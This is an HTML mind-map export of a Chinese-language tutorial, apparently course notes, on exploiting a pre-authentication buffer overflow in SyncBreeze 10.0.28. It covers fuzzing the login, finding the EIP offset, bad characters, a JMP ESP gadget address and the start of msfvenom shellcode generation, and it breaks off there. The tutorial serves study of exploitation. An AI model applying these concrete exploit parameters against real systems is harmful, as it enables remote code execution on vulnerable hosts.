@@ -1,0 +1,492 @@
+<html>
+<head>
+<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<meta content="text/css" http-equiv="Content-Style-Type">
+<title>windows缓冲区溢出</title>
+</head>
+<body>
+<h1 align="center" class="root">
+<a name="5t06drocgdemrlcmh6dudi2dm3">windows缓冲区溢出</a>
+</h1>
+<div align="center" class="globalOverview">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/images/windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA.jpg"></div>
+<h2 class="topic">
+<a name="57t71ji8pqvpurufujasr2fqgb">发现和利用SyncBreeze应用程序中的漏洞</a>
+</h2>
+<h2 class="topic">
+<a name="2h3hml1vabnbl1jvfiudi4f20b">发现漏洞</a>
+</h2>
+<h3 class="topic">
+<a name="1594888dn0n9jkr44p87820en4">&nbsp;三种方法</a>
+</h3>
+<h3 class="topic">
+<a name="60580pp4q7ag1qoed6b0inir1r">&nbsp;&nbsp;源代码审计</a>
+</h3>
+<h3 class="topic">
+<a name="4eau5qj6cpj6lmiu60c3bvros1">&nbsp;&nbsp;逆向工程</a>
+</h3>
+<h3 class="topic">
+<a name="6dubupf8mtfhfjv6n1vt3rgj30">&nbsp;&nbsp;模糊测试</a>
+</h3>
+<h3 class="topic">
+<a name="5kcsd12f1qd0i3pjlvhigsrmsg">&nbsp;&nbsp;&nbsp;基于生成的fuzz</a>
+</h3>
+<h3 class="topic">
+<a name="3e63kro26qt1aidhagd64ufhdt">&nbsp;&nbsp;&nbsp;&nbsp;如果模糊器按照文件格式或网络协议规范之类的内容从头创建格式错误的应用程序输入，则认为它是基于生成的。 </a>
+</h3>
+<h3 class="topic">
+<a name="4a344gt6fgd4b8o4arlffnm8ke">&nbsp;&nbsp;&nbsp;基于变异的fuzz</a>
+</h3>
+<h3 class="topic">
+<a name="49h8jaiiuo0cf3mmbf4679hjdf">&nbsp;&nbsp;&nbsp;&nbsp;基于变异的模糊器通过使用位翻转等技术来更改现有输入，以创建原始输入的格式错误的变体。</a>
+</h3>
+<h3 class="topic">
+<a name="4nn1gg67i4hkfenl2o27komnqs">&nbsp;&nbsp;&nbsp;知道应用程序输入格式的模糊器可以归为智能模糊器</a>
+</h3>
+<h3 class="topic">
+<a name="2ru097gm89a3d4kmn72insh4qe">&nbsp;fuzzinghttp协议</a>
+</h3>
+<h3 class="topic">
+<a name="4sabaoffsc4vpmnc31nm7t74h4">&nbsp;&nbsp;2017年，在SyncBreeze版本10.0.28的登录机制中发现了一个缓冲区溢出漏洞。 具体来说，HTTP POST登录请求的用户名字段可用于使应用程序崩溃。 由于不需要有效的凭据即可触发该漏洞，因此它被认为是预身份验证缓冲区溢出。</a>
+</h3>
+<h3 class="topic">
+<a name="5h3tlvqs1heoj6tm2if0t1mce0">&nbsp;&nbsp;   我们将从在Windows 10客户端计算机上启动SyncBreeze服务开始。 这可以通过启动服务控制台services.msc，右键单击SyncBreeze并选择&ldquo;启动&rdquo;来完成。</a>
+</h3>
+<h3 class="topic">
+<a name="6b5c567ueqeh86b4dd99fh7fai">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/5eop87jbk6c57g2egl0m6bcb8u.png"></p>
+<h3 class="topic">
+<a name="2n93cvl3th8aca4vij7c9bf0ch">&nbsp;&nbsp;&nbsp;&nbsp;服务登陆界面</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/3i2f7ipfdto4l091jubs15g7gi.png"></p>
+<h3 class="topic">
+<a name="216puadvu7uh4jfu4jf0chdmc5">&nbsp;&nbsp;如果我们对此漏洞没有任何预见，我们将开始对应用程序提供的每个输入字段进行模糊处理，以期避免意外行为或应用程序崩溃。 但是，出于本模块的目的，我们将跳过此步骤，而仅专注于易受攻击的用户名字段。 </a>
+</h3>
+<h3 class="topic">
+<a name="35m6dhfhj730jqqvgd2qrpeql1">&nbsp;&nbsp;&nbsp;为了从头开始编写的基于生成的模糊器，我们将首先对在易受攻击的交换期间在客户端和服务器之间传递的网络流量进行采样，以用作我们的输入数据或种子。（可以使用wireshark或burpsuite）</a>
+</h3>
+<h3 class="topic">
+<a name="43djctf4sihcotpcvleqpn7dgs">&nbsp;&nbsp;&nbsp;&nbsp;使用wireshark抓取的数据包</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/5en1asiel0suhhmsjgs67qhcqo.png"></p>
+<h3 class="topic">
+<a name="7pjmv609968vq2e3ie7mq34jl6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/2do51trjln91qulnqpjfqneo7s.png"></p>
+<h3 class="topic">
+<a name="0r50smmgaoq86tvmi8cgcjk2l1">&nbsp;&nbsp;使用python编写POC，将登陆用户名设置为100个A,使用socket编程将数据包发送给服务端</a>
+</h3>
+<h3 class="topic">
+<a name="32lr85kbge21n0jnk52ujlloe3">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/7thubfu57geinbo0a6ahslnsv9.png"></p>
+<h3 class="topic">
+<a name="3a3ig8eo78079fhvjndjdep0fc">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/2hm8f0l4d1hemq429pgu7s628a.png"></p>
+<h3 class="topic">
+<a name="0fkacnudlteb1om1rictoejedc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;基于上一个poc，本poc循环发送更长的用户名数据给服务器，两次发送之间会加入10秒的延迟</a>
+</h3>
+<h3 class="topic">
+<a name="179nbq3c0tc0klj4n3uqqmiv1u">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/0hjpb2a8oq1hn9c68gc1kv6ucq.png"></p>
+<h3 class="topic">
+<a name="78eqkkhr8m83ed13g590dcgbbf">&nbsp;&nbsp;   在运行我们的模糊器之前，我们必须在运行状态下将调试器附加到SyncBreeze，以捕获任何潜在的访问冲突。&#13;
+   但是，我们必须首先确定几个SyncBreeze进程中的哪个正在TCP端口80上进行侦听。尽管Immunity Debugger的&ldquo;侦听&rdquo;列旨在显示此信息，但在我们的情况下不可用。 相反，我们将为此使用Microsoft TCPView，方法是首先从&ldquo;选项&rdquo;菜单中取消选中&ldquo;解析地址&rdquo;以获得图209所示的视图。</a>
+</h3>
+<h3 class="topic">
+<a name="70nbh3drirng4gqeqro3b713t0">&nbsp;&nbsp;&nbsp;Microsoft TCPView</a>
+</h3>
+<h3 class="topic">
+<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview" name="4ha7ii803nnq5d0438gh65d0cf">&nbsp;&nbsp;&nbsp;&nbsp;https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview</a>
+</h3>
+<h3 class="topic">
+<a name="2t7m8vg9631lfauekfdd4b7hn5">&nbsp;&nbsp;&nbsp;SyncBreeze服务的688进程用于监听80端口，所以调试器应当附加调试该进程，但是该进程为系统进程，所以调试器需要以管理员权限运行</a>
+</h3>
+<h3 class="topic">
+<a name="39q3l7hilc93hq8t7lero7q3sk">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/46uil37fdnvect3l8bjhj4ed8h.png"></p>
+<h3 class="topic">
+<a name="7k0i98rj8l2radbeiar6a01ied">&nbsp;&nbsp;&nbsp;&nbsp;选中要附加调试的服务，附加调试之后让程序继续运行</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/1m01nurvs2qg81s33eive948ln.png"></p>
+<h3 class="topic">
+<a name="3k6k08kfbo0hk6qmnb5kt1vq33">&nbsp;&nbsp;运行fuzz脚本</a>
+</h3>
+<h3 class="topic">
+<a name="7tkgm1pjgqouuarqjuhrlbo9ct">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/3pibrun7s9mt84lkm6hvhcgf07.png"></p>
+<h3 class="topic">
+<a name="174n7l5g66a1m28qn61b5mjdgb">&nbsp;&nbsp;当我们的用户名缓冲区长度达到大约800个字节时，调试器会在尝试执行地址41414141的代码时向我们显示访问冲突：</a>
+</h3>
+<h3 class="topic">
+<a name="4enisae1rlnco998psl70n081s">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/0vgbi5s7mqbr06uubg9ij5hmkk.png"></p>
+<h3 class="topic">
+<a name="15s99ba0c6prb9lln8tt8pvrfk">&nbsp;&nbsp;通过服务控制台services.msc重新启动对应服务</a>
+</h3>
+<h3 class="topic">
+<a name="0i53rnmsk47segc1d3pobsqiic">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/7dkcu1ntu1p0q2auj8bp05vphp.png"></p>
+<h2 class="topic">
+<a name="4jpu1smkh85imftbq798eqemq3">win32缓冲区溢出漏洞利用</a>
+</h2>
+<h3 class="topic">
+<a name="3cojgfk8tk8rlednrmh3g7r0pm">&nbsp;关于DEP，ASLR和CFG</a>
+</h3>
+<h3 class="topic">
+<a name="4ef3igkovj4buvii1vkl9pdtic">&nbsp;&nbsp;   DEP是一组硬件和软件技术，可对内存执行其他检查，以帮助防止恶意代码在系统上运行。  DEP的主要好处是通过在尝试进行此类尝试时引发异常来帮助防止从数据页执行代码。&#13;
+   每次引导操作系统时，ASLR都会使加载的应用程序和DLL的基址随机化。 在未实现ASLR的较旧Windows操作系统（如Windows XP）上，每次都将所有DLL加载到相同的内存地址，这使得利用变得更加简单。 与DEP结合使用时，ASLR可以非常有效地缓解剥削。&#13;
+   最后，CFG是Microsoft控制流完整性的实现，它对间接代码分支进行验证，从而防止覆盖函数指针。</a>
+</h3>
+<h3 class="topic">
+<a name="36ig6gkdulrp87mrh59ga3e4si">&nbsp;重现异常</a>
+</h3>
+<h3 class="topic">
+<a name="4rrqv4mftf70ioi87onlmdmn91">&nbsp;&nbsp;假定，在登录期间通过HTTP POST请求提交长度约为800字节的用户名时，SyncBreeze可能容易受到缓冲区溢出的影响。 开发过程中的首要任务是编写一个简单的脚本，该脚本将复制我们观察到的崩溃，而不必每次都运行模糊器。</a>
+</h3>
+<h3 class="topic">
+<a name="2ns5ak61tk4p9ph5ngq5gsaiet">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/02jf8o254bch92kn874tq2qisj.png"></p>
+<h3 class="topic">
+<a name="47jd5sv7355ojf4lp8k5uhbko8">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/3khno5krp74r3l5mndalh2a4s4.png"></p>
+<h3 class="topic">
+<a name="3fjccdkmko0pej5287vbbmqaue">&nbsp;控制eip</a>
+</h3>
+<h3 class="topic">
+<a name="7a9fjki9ri6h04clgmmk5gdmnk">&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/6peh3lpglk5u977tp744htfg2s.png"></p>
+<h3 class="topic">
+<a name="7r52ub08lqqec8lnrp4kfaflnc">&nbsp;&nbsp;可以使用二分法或非重复的字符串序列作为进行溢出的数据，从而当异常发生时，定位eip被那一部分溢出数据覆盖</a>
+</h3>
+<h3 class="topic">
+<a name="6gd5dldb101c5pmfs7p2tdclso">&nbsp;&nbsp;&nbsp;Metasploit的pattern_create.rb Ruby脚本来生成非重复字符串。  pattern_create.rb脚本位于/ usr / share / metasploit-framework / tools / exploit /中，但是可以通过运行msf-pattern_create在Kali中的任何位置运行</a>
+</h3>
+<h3 class="topic">
+<a name="5ssp7nuurl6h575bvo23edlotr">&nbsp;&nbsp;&nbsp;&nbsp;msf-pattern_create -h</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/64ubf47qbk3hql9mdkumcq2c5d.png"></p>
+<h3 class="topic">
+<a name="44411oi5cbaam5afs04kukf39b">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msf-pattern_create -l 800：生成长度为800的不重复字符串</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/2pl026gu2s58f2cqb0b5ii1h00.png"></p>
+<h3 class="topic">
+<a name="21u62v7o07qeeo36ir50ba0fks">&nbsp;&nbsp;使用不重复字符串更新fuzz脚本</a>
+</h3>
+<h3 class="topic">
+<a name="2v80jjcsnr71129kmr12pp3n8j">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/7j4j9cfeiafa08ivmimilpm7as.png"></p>
+<h3 class="topic">
+<a name="0b66t0vgni35u2huq5d4t1vai9">&nbsp;&nbsp;&nbsp;&nbsp;异常发生时，不重复字符串覆盖eip</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/116mn50bjs37hhf20l04ipn8e0.png"></p>
+<h3 class="topic">
+<a name="1uatk3gif05n033mc9c3btu8vj">&nbsp;&nbsp;使用pattern_create.rb的同伴（名为pattern_offset.rb）来确定字符串中这四个特定字节的偏移量。 在Kali中，可以使用msf-pattern_offset从任何位置运行此脚本。</a>
+</h3>
+<h3 class="topic">
+<a name="279c2i8bjjtocl3hqe72fe09do">&nbsp;&nbsp;&nbsp;用-l指定原始字符串的长度（在我们的情况下为800），使用-q指定在EIP中找到的字节（42306142）：</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/46u9vcnl2a6k4gc026tllbu0t6.png"></p>
+<h3 class="topic">
+<a name="7ko9spsq8p73u15q3clob555p4">&nbsp;&nbsp;&nbsp;&nbsp;修改字符串，尝试将42424242覆盖到eip</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/3160k436s8g23lf2j8coju75lj.png"></p>
+<h3 class="topic">
+<a name="6ieumptkgousrqrs1eq4d7eq7b">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;成功覆盖</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/3gmbpqble5q5onttuk50bptthh.png"></p>
+<h3 class="topic">
+<a name="3p86hnamuqfh9o7tv32ieg3psi">&nbsp;定位shellcode</a>
+</h3>
+<h3 class="topic">
+<a name="6ktavslsn0vu9o5c3rju69aqc4">&nbsp;&nbsp;一般将shellcode包含在溢出缓冲区中，并且在程序溢出后，esp指向栈中的溢出数据，所以esp可以用于寻址溢出数据中的shellcode</a>
+</h3>
+<h3 class="topic">
+<a name="1huq7bfib8m46sehsdclp84uop">&nbsp;&nbsp;&nbsp;由于esp之后的存在</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/4g4to58pd5hdkfksebstojci1i.png"></p>
+<h3 class="topic">
+<a name="2fe8gd8a4fe3v9ps2i3vgrjchq">&nbsp;&nbsp;缓冲区中只有16个C，这对于我们的shellcode来说几乎没有足够的空间。 解决此问题的最简单方法是尝试将漏洞利用程序中的缓冲区长度从800字节增加到1500字节，并查看这是否为我们的shellcode提供了足够的空间，而又不会破坏缓冲区溢出条件或更改崩溃的性质。</a>
+</h3>
+<h3 class="topic">
+<a name="0obbfj6csbo9v88ga3v8a0qno7">&nbsp;&nbsp;&nbsp;根据应用程序和漏洞类型的不同，输入内容的长度可能会有限制。 在某些情况下，增加缓冲区的长度可能会导致完全不同的崩溃，因为较大的缓冲区会覆盖目标应用程序使用的堆栈上的其他数据。</a>
+</h3>
+<h3 class="topic">
+<a name="21hjv66cgfob1srbs0t2votrig">&nbsp;&nbsp;&nbsp;&nbsp;将整个溢出字符串的长度设置为1500字节，从而尝试溢出，并保证不会产生其他异常</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/2u9jft37m30n17ke6kpv56o160.png"></p>
+<h3 class="topic">
+<a name="0pkk6j2t0ctjp35gjltgqipfmu">&nbsp;&nbsp;一旦发送了新的更长的缓冲区，调试器中就会观察到类似的崩溃。 但是，这一次，我们发现ESP指向另一个地址值0x030E745C</a>
+</h3>
+<h3 class="topic">
+<a name="6meklog8fttufl28eaa2mjt0k5">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/1ps2vq82geiarpbhse809t5tsi.png"></p>
+<h3 class="topic">
+<a name="6r8tgdf2ipgr5s6mo0pqq2p3h1">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/4pk41qfrlp8t75vhoebh8g1rd9.png"></p>
+<h3 class="topic">
+<a name="6ha7sv981jo2793d828nsqe44m">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时shellcode就有了足够的存储空间，每次运行漏洞利用程序时，ESP的地址都会更改，但仍指向缓冲区。</a>
+</h3>
+<h3 class="topic">
+<a name="55isl7iu0fu425es8nt3bjb5t3">&nbsp;检查不良字符</a>
+</h3>
+<h3 class="topic">
+<a name="6lrrj5i8f0tqk6fc3kqufu0u1m">&nbsp;&nbsp;根据应用程序，漏洞类型和所使用的协议的不同，某些字符可能被认为是&ldquo;不良&rdquo;字符，不应在我们的缓冲区，返回地址或shellcode中使用。</a>
+</h3>
+<h3 class="topic">
+<a name="09hok3qgud8gd8vfihrtgfl9fs">&nbsp;&nbsp;&nbsp;漏洞利用程序作为HTTP POST请求的一部分发送，因此应避免使用0x0D（返回字符），它表示HTTP字段的结尾</a>
+</h3>
+<h3 class="topic">
+<a name="3i1t86hhpc6jrcqfro7n8buiss">&nbsp;&nbsp;&nbsp;c语言中0x00作为字符串结尾，会导致字符串操作的终止不能出现在溢出数据中</a>
+</h3>
+<h3 class="topic">
+<a name="2huus3ni2pmo97j67ihcv3jc53">&nbsp;&nbsp;确定哪些字符不利于特定漏洞利用的一种方法是，将所有可能的字符（从0x00到0xFF）作为缓冲区的一部分发送，并查看崩溃后应用程序如何处理这些字符。</a>
+</h3>
+<h3 class="topic">
+<a name="41b54mh7sabftcjbt0aujnir0j">&nbsp;&nbsp;&nbsp;该脚本用于检测哪些字符不能用于溢出数据</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/59s2k57bble40m5md2m5am4gkc.png"></p>
+<h3 class="topic">
+<a name="5b28n0uh0tfvdqc3vogm40cfqt">&nbsp;&nbsp;执行poc后，我们可以右键单击ESP并选择&ldquo;转到内存&rdquo;以显示内存中的输入缓冲区十六进制字符</a>
+</h3>
+<h3 class="topic">
+<a name="70mu2g24102991igfbuf427nts">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/7k2v8l55b026cdghaj7cp4ipo1.png"></p>
+<h3 class="topic">
+<a name="6k7oqi3c0s5ck0lt995rfq3pub">&nbsp;&nbsp;&nbsp;&nbsp;输出显示只有十六进制值0x01至0x09使其进入了堆栈存储器缓冲区。 没有下一个字符0x0A的符号，该字符应位于地址0x03267465。   当我们认为0x0A字符表示换行符时，这并不奇怪，换行符终止HTTP字段的方式与回车符相同。说明0x0a是坏字符</a>
+</h3>
+<h3 class="topic">
+<a name="5e0ftiqasab4e59ic2bepm7pbi">&nbsp;&nbsp;   当我们从测试脚本中删除0x0A字符并重新发送有效负载时，结果缓冲区将在十六进制值0x0C之后终止，这表明返回字符0x0D也是一个坏字符，</a>
+</h3>
+<h3 class="topic">
+<a name="4v8r79f2ih1h6r16732l4ddjj1">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/6eoplgotpjic4maub24tbleu0c.png"></p>
+<h3 class="topic">
+<a name="74567qlh03671o2u9c0hpnd6nd">&nbsp;&nbsp;&nbsp;&nbsp;以这种方式继续，我们发现0x00、0x0A，0x0D，0x25、0x26、0x2B和0x3D将在尝试使目标缓冲区溢出的同时破坏我们的输入缓冲区。</a>
+</h3>
+<h3 class="topic">
+<a name="4c79h0o2p0l9b48gm5qn32i7gj">&nbsp;重定向执行流程</a>
+</h3>
+<h3 class="topic">
+<a name="7josv2upjbvb6vhblteva8nsoa">&nbsp;&nbsp;此时需要将崩溃时程序执行流程转移到esp指向的shellcode处执行，由于堆栈地址经常更改，尤其是在诸如SyncBreeze之类的线程应用程序中，因为每个线程在操作系统分配的内存中都有其保留的堆栈区域。&#13;
+   因此，对特定的堆栈地址进行硬编码将不是到达缓冲区的可靠方法。</a>
+</h3>
+<h3 class="topic">
+<a name="0mnuvqif62qpe218c0099dmgo3">&nbsp;寻找返回地址</a>
+</h3>
+<h3 class="topic">
+<a name="7v5gk24fnf5uq0vmbqpdjnnaqo">&nbsp;&nbsp;通过寻找程序中jmp esp指令的地址，并将其覆盖到返回地址，可以修改程序流程从而执行shellcode</a>
+</h3>
+<h3 class="topic">
+<a name="0b42892tpt61kjgv2usniv3dgb">&nbsp;&nbsp;&nbsp;   Windows中的许多支持库都包含此常用指令，但是我们需要找到符合某些条件的参考。 首先，库中使用的地址必须是静态的，使用ASLR支持编译的库就不适用。 其次，指令的地址不得包含任何会破坏利用的不良字符，因为该地址将成为我们输入缓冲区的一部分。</a>
+</h3>
+<h3 class="topic">
+<a name="1ihacuqicmj4h8tth1q3ild8du">&nbsp;&nbsp;使用Immunity Debugger脚本mona.py寻找gadget</a>
+</h3>
+<h3 class="topic">
+<a name="4gmqbsh2r6ufmc18aeqph22qdp">&nbsp;&nbsp;&nbsp;mona插件</a>
+</h3>
+<h3 class="topic">
+<a name="28dk26cjbubcoilh29g90v3mum">&nbsp;&nbsp;&nbsp;&nbsp;https://github.com/corelan/mona</a>
+</h3>
+<h3 class="topic">
+<a name="5oceqc29pgi2vmfr49ng4166h7">&nbsp;&nbsp;&nbsp;!mona modules指令查询当前被调试进程加载的模块</a>
+</h3>
+<h3 class="topic">
+<a name="0prlo1dhft8v5ngp2uvq7vvm93">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/3fk6f3m6ac18fljpofrv5081k9.png"></p>
+<h3 class="topic">
+<a name="3tl63bn5rn8d5u60ospaer08ps">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此输出中的列包括当前内存位置（基地址和最高地址），模块的大小，几个标志，模块版本，模块名称和路径。&#13;
+    我们可以看到syncbrs.exe可执行文件已禁用SafeSEH（结构化异常处理程序覆盖，这是一种利用漏洞的内存保护技术），ASLR和NXCompat（DEP保护）。&#13;
+   换句话说，可执行文件尚未使用任何内存保护方案进行编译，并且将始终可靠地加载到同一地址，这使其成为我们理想的选择。&#13;
+   但是，它始终加载在基址0x00400000上，这意味着所有指令的地址（0x004XXXXX）将包含空字符，不适合我们的缓冲区。</a>
+</h3>
+<h3 class="topic">
+<a name="73ceq8unof3a25kd62slghvban">&nbsp;&nbsp;&nbsp;发现LIBSSP.DLL也符合我们的需求，并且地址范围似乎不包含不良字符。 这非常适合我们的需求，则在其中寻找jmp esp的地址</a>
+</h3>
+<h3 class="topic">
+<a name="1gp2ejien0dpvia498e9258lth">&nbsp;&nbsp;&nbsp;&nbsp;如果此应用程序是在DEP支持下编译的，则我们的JMP ESP地址必须位于模块的.text代码段中，因为这是唯一同时具有Read（R）和Executable（E）权限的段。 但是，由于未启用DEP，因此我们可以自由使用此模块中任何地址的指令</a>
+</h3>
+<h3 class="topic">
+<a name="30i30855947locei8oo5ud25in">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 查找等效于JMP ESP的操作码，可以使用Metasploit NASM Shell ruby脚本msfnasm_shell</a>
+</h3>
+<h3 class="topic">
+<a name="658od6edfh5ml3uncabevfcgjs">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以找到jmp esp操作码为0xffe4</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/0efhaumubop8hfnau8ep1erol5.png"></p>
+<h3 class="topic">
+<a name="3kp91lor937807atot1biblv2m">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;!mona find -s &ldquo;\xff\xe4&rdquo; -m &ldquo;libspp.dll&rdquo;用于在对应模块中查找jmp esp指令，找到地址0x10090c83处有jmp esp指令，且该地址值不包含话坏字符</a>
+</h3>
+<h3 class="topic">
+<a name="59e39cc6cg4puhrl1jlil1hubb">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;!mona find -s &ldquo;\xff\xe4&rdquo; -m &ldquo;libspp.dll&rdquo;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/7od5sgd8vp7o9ninmf879ho5sv.png"></p>
+<h3 class="topic">
+<a name="71tdq0uk58p6idis7kifpqljko">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;点击按钮输入地址即可查询到该地址处的指令</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/10rv3nsrmic88s0lqhcss6gtdl.png"></p>
+<h3 class="topic">
+<a name="1rknet18iqi2nijkafb4jgqphj">&nbsp;&nbsp;将找到的gadget地址覆盖到eip处，尝试与运行exp，执行gadget</a>
+</h3>
+<h3 class="topic">
+<a name="1gvak1g43098iq6pj01u1kcq3u">&nbsp;&nbsp;&nbsp;注意x86中数据小端存储</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/3lif6t2b2f641geg7bgho7k6td.png"></p>
+<h3 class="topic">
+<a name="4a3qo3aa2ebiu1jc9o1ld00lag">&nbsp;&nbsp;&nbsp;&nbsp;成功执行gadget</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/061sk5vhmge2g204dpo4ou71ka.png"></p>
+<h3 class="topic">
+<a name="22lku4bsgk5tqj4j1gf50vip5s">&nbsp;使用msf生成shellcode</a>
+</h3>
+<h3 class="topic">
+<a name="6duraa6pc5v4n8mbia4d6slra9">&nbsp;&nbsp;MSFvenom是Msfpayload和Msfencode的组合，将这两个工具都放在一个Framework实例中。 它可以生成shellcode有效负载，并使用各种不同的编码器对其进行编码。</a>
+</h3>
+<h3 class="topic">
+<a name="69rq326iilesppi6tno2fsp6gb">&nbsp;&nbsp;&nbsp;https://blog.rapid7.com/2014/12/09/good-bye-msfpayload-and-msfencode/ &#13;
+https://www.offensive-security.com/metasploit-unleashed/msfpayload/ &#13;
+https://www.offensive-security.com/metasploit-unleashed/msfencode/</a>
+</h3>
+<h3 class="topic">
+<a name="6vmq96r7vup6bekc7e9t97okg1">&nbsp;&nbsp;msfvenom命令可以自动生成500多个shellcode有效负载选项</a>
+</h3>
+<h3 class="topic">
+<a name="0fhaqv783j2n2vkia0i24m6s4u">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/28f3dto4no6k66tsa7bjou46dg.png"></p>
+<h3 class="topic">
+<a name="7rshb40f62t92sa9ghogr7lmfv">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/4kepgpm68ml4287n3hk9345ifg.png"></p>
+<h3 class="topic">
